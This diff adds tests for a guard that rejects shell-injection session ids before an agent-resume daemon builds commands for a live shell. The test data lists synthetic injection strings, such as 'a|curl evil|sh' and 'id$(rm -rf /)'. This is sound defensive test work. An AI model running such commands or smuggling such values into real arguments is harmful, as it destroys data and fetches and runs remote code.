@@ -11,6 +11,8 @@ import {
   extractJsonlPermissionMode,
   isManagedTmuxName,
   isReconstitutionTarget,
+  isValidResumeSessionId,
+  OPENCODE_SESSION_ID_RE,
   resolveResumeAgentType,
   resumeTmuxPrefix,
   rewriteSubagentJsonlToUuid,
@@ -372,5 +374,68 @@ describe("cursor resume dispatch end to end", () => {
     expect(cmd).not.toContain("claude");
     expect(cmd).not.toContain("--full-auto");
     expect(resumeTmuxPrefix(agentType)).toBe("cu");
+  });
+});
+
+// RCE guard (security critic): a session id flows verbatim into a resume command the
+// daemon TYPES INTO A LIVE SHELL. isValidResumeSessionId is the construction-boundary
+// backstop refusing any id that isn't its client's real shape — it covers convex rows
+// that were poisoned before the watcher ingest checks existed. Payloads below are
+// SYNTHETIC.
+describe("isValidResumeSessionId — shell-injection ids are refused before command construction", () => {
+  const INJECTION_IDS = [
+    "x; touch /tmp/pwned #",   // the exact pi filename-fallback poison from the finding
+    "id`whoami`",
+    "id$(rm -rf /)",
+    "a|curl evil|sh",
+    "a && whoami",
+    "a\nrm -rf /",
+    "id with spaces",
+  ];
+
+  test("claude / codex / cursor / pi refuse every injection payload (id is interpolated)", () => {
+    for (const agent of ["claude", "codex", "cursor", "pi"] as const) {
+      for (const bad of INJECTION_IDS) {
+        expect(isValidResumeSessionId(agent, bad)).toBe(false);
+      }
+    }
+  });
+
+  test("opencode requires its exact ses_<base62> shape, not just a ses_ prefix", () => {
+    // Real id observed in a live opencode.db.
+    expect(OPENCODE_SESSION_ID_RE.test("ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(true);
+    expect(isValidResumeSessionId("opencode", "ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(true);
+    // A spoofed SQLite row that merely STARTS WITH ses_ (the finding's example).
+    expect(isValidResumeSessionId("opencode", "ses_; curl x|sh #")).toBe(false);
+    expect(isValidResumeSessionId("opencode", "ses_has_underscore")).toBe(false);
+    expect(isValidResumeSessionId("opencode", "notses_abc")).toBe(false);
+    expect(isValidResumeSessionId("opencode", "550e8400-e29b-41d4-a716-446655440000")).toBe(false);
+  });
+
+  test("every real client id still passes byte-identically (no valid resume broken)", () => {
+    expect(isValidResumeSessionId("claude", "550e8400-e29b-41d4-a716-446655440000")).toBe(true);
+    expect(isValidResumeSessionId("claude", "agent-abcdef1234")).toBe(true);
+    expect(isValidResumeSessionId("claude", "forked-agent-abc-550e8400-e29b-41d4-a716-446655440000")).toBe(true);
+    expect(isValidResumeSessionId("codex", "12345678-1234-1234-1234-123456789abc")).toBe(true);
+    expect(isValidResumeSessionId("cursor", "chat-abc123")).toBe(true);
+    expect(isValidResumeSessionId("pi", "a7c9c0e2-1d82-4d42-b342-f59fefc7b9f5")).toBe(true);
+  });
+
+  test("gemini is exempt — its resume ignores the id (`gemini --resume latest`)", () => {
+    expect(isValidResumeSessionId("gemini", "anything; rm -rf /")).toBe(true);
+  });
+
+  test("empty id is refused for every gated client", () => {
+    expect(isValidResumeSessionId("claude", "")).toBe(false);
+    expect(isValidResumeSessionId("opencode", "")).toBe(false);
+    expect(isValidResumeSessionId("codex", "")).toBe(false);
+  });
+
+  test("a valid id the gate accepts is exactly what buildNonClaudeResumeCommand emits", () => {
+    // The daemon calls isValidResumeSessionId BEFORE buildNonClaudeResumeCommand, so a
+    // refused id never reaches construction; a valid one builds the real command.
+    const good = "ses_08f9926d3ffelzGS3Q3CteaeUk";
+    expect(isValidResumeSessionId("opencode", good)).toBe(true);
+    expect(buildNonClaudeResumeCommand("opencode", good)).toBe(`opencode -s ${good}`);
   });
 });
